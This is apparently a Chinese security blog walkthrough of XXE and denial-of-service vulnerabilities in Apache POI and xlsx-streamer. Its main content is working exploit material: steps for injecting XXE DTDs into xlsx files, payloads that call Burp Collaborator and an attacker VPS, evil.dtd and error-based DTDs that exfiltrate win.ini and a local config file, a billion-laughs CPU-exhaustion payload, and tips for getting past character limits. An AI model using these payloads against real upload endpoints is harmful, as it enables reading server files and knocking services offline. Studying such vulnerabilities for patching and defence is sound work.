payload生成：
https://github.com/whitel1st/docem

### [CVE-2014-3529]Apache poi-ooxml XXE

#### 影响范围
Apache poi <= 3.10（poi-ooxml-3.10-FINAL.jar及以下版本）
参考：
https://www.itread01.com/hkpcyyp.html
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317101600274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70)
利用方式：
1、新建test.xlsx；
2、解压；
3、修改`[Content_Types].xml`文件，在第一行xml声明下面添加：


```xml
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://ufdvoqvmlhs4r9pv6if6hkyqhhn7bw.burpcollaborator.net/test_xxe">
%xxe;
]>
```
4、重新添加到压缩文件中：
```bash
zip -r ../test2.xlsx *
```
（或者直接在7zip里打开然后修改）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116143043610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)
上传完之后，虽然碰到了不能解析content types部分的问题，但是请求还是发出来了：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116143254710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)


代码跟踪：
不管是：

还是：

都会跟到这里：
`org\apache\poi\poi-ooxml\3.9\poi-ooxml-3.9.jar!\org\apache\poi\openxml4j\opc\OPCPackage#open`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317105053229.png)
贴一下最近的调用栈：
```
getPartsImpl:162, ZipPackage (org.apache.poi.openxml4j.opc)
getParts:662, OPCPackage (org.apache.poi.openxml4j.opc)
open:269, OPCPackage (org.apache.poi.openxml4j.opc)
open:39, PackageHelper (org.apache.poi.util)
<init>:204, XSSFWorkbook (org.apache.poi.xssf.usermodel)
ooxml_xxe:47, ooxmlXXE (org.joychou.controller.othervulns)
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317105345583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70)
可以看到，首先就是对这个xml文件的解析：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317105650169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70)
继续跟进，有一个专门解析Content_Types文件的方法：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317105837372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70)
这里应该就是XXE的点了：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200317110019249.png)

### [CVE-2017-5644]Apache poi-ooxml DOS漏洞
影响范围：
<= 3.14

对应pom文件：
```xml
        <dependency>
            <groupId>org.apache.poi</groupId>
            <artifactId>poi-ooxml</artifactId>
            <version>3.14</version> <!-- 3.10-FINAL -->
        </dependency>
```

碰到报错：
```
XML解析异常之 The processing instruction target matching "[xX][mM][lL]" is not allowed.
```
参考这里解决：
https://my.oschina.net/u/2007466/blog/310007
https://www.ibm.com/support/pages/processing-instruction-target-matching-xxmmll-not-allowed-1


poc参考这里：
https://bbs.huaweicloud.com/blogs/103994
貌似是漏洞作者。
不是之前的修改
而是改`sharedStrings.xml`，改成这样：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [     
    <!ENTITY e1 "">
    <!ENTITY e2 "&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;&e1;">
    <!ENTITY e3 "&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;&e2;">
    <!ENTITY e4 "&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;&e3;">
    <!ENTITY e5 "&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;&e4;">
    <!ENTITY e6 "&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;&e5;">
    <!ENTITY e7 "&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;&e6;">
    <!ENTITY e8 "&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;&e7;">
    <!ENTITY e9 "&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;&e8;">
    <!ENTITY e10 "&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;&e9;">
    <!ENTITY e11 "&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;&e10;">
]>
<x>&e11;</x>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116162944678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)
DOS（消耗CPU资源）的效果如下：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116163121641.gif#pic_center)
CPU从启动时的10%，最后通过一次次的发包，最后可以占满CPU资源。
我们将服务停止，立马可以恢复到之前的CPU占用水平：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116163234168.gif#pic_center)
使用3.15版本可以修复这个漏洞。报错大概是这样的：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116163828961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)

```
org.xml.sax.SAXParseException: The parser has encountered more than "4,096" entity expansions in this document; this is the limit imposed by the application.
```

### [CVE-2019-12415]Apache POI <= 4.1.0 XXE 漏洞 
参考：
https://b1ue.cn/archives/241.html
https://xz.aliyun.com/t/6996#toc-3
https://infosecwriteups.com/cve-2019-12415-xml-processing-vulnerability-579fdbfbaa18

其中的条件之一是必须使用`XSSFExportToXml`类 进行xlsx 转 xml。
参考：
https://github.com/alibaba/easyexcel/issues/1627
但是发现这个easyexcel并没有使用到`XSSFExportToXml`类。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210316102358132.png)


#### xlsx-streamer.jar的XXE漏洞
影响范围
xlsx-streamer.jar-2.0.0及以下版本

利用点
xl/workbook.xml


先使用这个payload：
```xml
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://oh98u9fef0g5jmf8j8b2raejva15pu.burpcollaborator.net/x"> %ext;
]>
<r></r>
```
虽然报了这个错，
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116170657305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)

```
org.xml.sax.SAXParseException; systemId: http://oh98u9fef0g5jmf8j8b2raejva15pu.burpcollaborator.net/x; lineNumber: 1; columnNumber: 2; The markup declarations contained or pointed to by the document type declaration must be well-formed.
```
但是还是解析了：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116170435319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)
payload参考：
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
由于是盲xxe，所以需要带外方式读取文件，然后修改之前的payload为
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///C:/Windows/win.ini" >
<!ENTITY callhome SYSTEM "http://200mdnysyezj20ym2mugaoxxeokm8b.burpcollaborator.net/?%xxe;">
]
>
<foo>&callhome;</foo>
```

注意需要加上协议`http://`，不然报这个错：
```java
com.monitorjbl.xlsx.exceptions.ParseException: java.net.MalformedURLException: no protocol: 200mdnysyezj20ym2mugaoxxeokm8b.burpcollaborator.net/?%xxe;
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116171054619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)

更多信息参考：
https://ca0y1h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/

发现`%xxe`并不能被替换成上面win.ini的结果，于是尝试其他的payload：
```
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
    <!ENTITY  % xxe SYSTEM "http://49.x.y.z:8888/evil.dtd" >
    %xxe;
    %send;
]>
```
这样，先请求
```
http://49.x.y.z:8888/evil.dtd
```
然后在vps上的8888端口开启http服务：
```
python3 -m http.server 8888
```
其中evil.dtd的内容为：
```
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM '<http://49.x.y.z:8888/?%file;>'>"
>
%all;
```
（这里只定义了all变量，而file变量是我们在xlsx的xml文件中作为payload传过去的）
这里比较特殊，因为win.ini文件的开头就是`;`，导致拼接出来的url被报错了，然后可以在报错中被回显出来：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116174018259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)
所以我本以为文件的结果会通过url传到vps上，但是貌似这里可以直接回显出来（不过还是至少需要一次外联请求evil.dtd）
尝试读一下其他的文件：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116174401692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)


XXE利用里，读文件的事儿很多，
比如：
```
 The declaration for the entity "send" must end with '>'.
 The reference to entity "type" must end with the ';' delimiter.
```

文件内容有`#`或者`=`，则会出现
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201116182655532.png#pic_center)


注意这里的dtd文件一定要写出那样，如果把<> 去掉，变成这样
```xml
<!ENTITY % all
"<!ENTITY &#x25; send SYSTEM '<http://49.x.y.z:8888/?%file;>'>"
>
%all;
```
则会报错：
```
java.net.MalformedURLException: Illegal character in URL
```
且不会包报错信息回显出来。

另外的盲XXE的利用方式。还是利用报错的原理，不过这次是用文件不存在的报错，而且把更多的payload放到完美控制的服务端，而不是xlsx的端，更加方便修改。
xlsx文件中只需要这样：
```xml
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://49.x.y.z:8888/ext.dtd">
    %ext;
]>
```
然后服务器的ext.dtd文件像这样：
```xml
<!ENTITY % file SYSTEM "file:///D:/repos/xray/config.yaml">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
不过碰到一些#等特殊服务还是不行。
注意这里的file协议后面的斜杠需要有三个（本地），如果只有两个，是会从网络中查找的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117151157639.png#pic_center)
建议使用ftp方式，支持的特殊符号更多，更不容易失败，参考：
https://www.cnblogs.com/zpchcbd/p/12900903.html
总结：
> 
> 1、所有的【\r】 都会被替换为【\n】
2、如果不包含特殊字符，低版本 ftp 可以读多行文件，高版本 ftp 只可以读单行文件，全版本 http 都只可以读单行文件，所以这里通用的方法就是FTP来进行读取
3、版本限制是 <7u141 和 <8u162 才可以读取整个文件
4、如果含有特殊字符 【%】 【&】 会完全出错
5、如果含有特殊字符 【’】 【”】 可以稍微绕过
6、如果含有特殊字符 【?】，对 http 无影响，对 ftp 会造成截断
7、如果含有特殊字符【/】， 对 http 无影响，对 ftp 需要额外增加解析的 case
8、如果含有特殊字符【#】，会造成截断

测试发现简单的还可以，
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117153142150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70#pic_center)

但是依然不是很好用。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117153104487.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201117153159666.png#pic_center)

XLSX文件的XXE：
> xl/workbook.xml提供了工作簿内容的概述，通常是大多数解析开始的地方，因为它将包含工作表及其名称的列表。单个工作表本身位于xl/worksheets目录下，通常内容最终会进入xl/sharedStrings.xml。

首先尝试`xl/workbook.xml`，然后是`xl/sharedStrings.xml`。

参考：[利用EXCEL进行XXE攻击](https://xz.aliyun.com/t/3741)

### 绕过特殊符号限制的payload


### 基于local DTD的payload
- https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

## 参考
- [9102年Java里的XXE](https://www.leadroyal.cn/p/914/)
- [一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)
- [A blind XXE injection callback handler. Uses HTTP and FTP to extract information.](https://github.com/TheTwitchy/xxer)
- [Java底层修改对XXE利用FTP通道的影响](http://scz.617.cn:8/misc/201911011122.txt)
- [XXE bruteforce wordlist including local DTD payloads from https://github.com/GoSecure/dtd-finder](https://gist.github.com/honoki/d7035c3ccca1698ec7b541c77b9410cf)
- [Misconfigurations in Java XML Parsers](https://immunityservices.blogspot.com/2021/02/misconfigurations-in-java-xml-parsers.html)
